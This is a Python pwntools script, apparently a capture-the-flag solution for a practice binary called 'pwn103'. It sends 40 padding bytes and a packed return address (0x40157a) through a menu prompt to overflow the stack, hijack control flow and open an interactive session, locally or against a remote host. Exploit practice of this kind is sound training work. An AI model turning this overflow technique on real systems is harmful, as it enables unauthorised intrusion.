from pwn import *
from struct import pack
import sys

context.binary = exe = ELF("./pwn103.pwn103")
context.terminal = "konsole -e".split()

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        attach(self.p, script)
        
    def send(self, content):
        p = self.p
        p.sendlineafter(b"Choose the channel:", b"3")
        p.sendlineafter(b"[pwner]:", content)

if args.REMOTE:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()

x = Exploit(p)

payload = b""
payload += b"A"*40
payload += pack("<I",0x40157a)

# x.debug("break *general+185\nc")
x.send(payload)
p.interactive()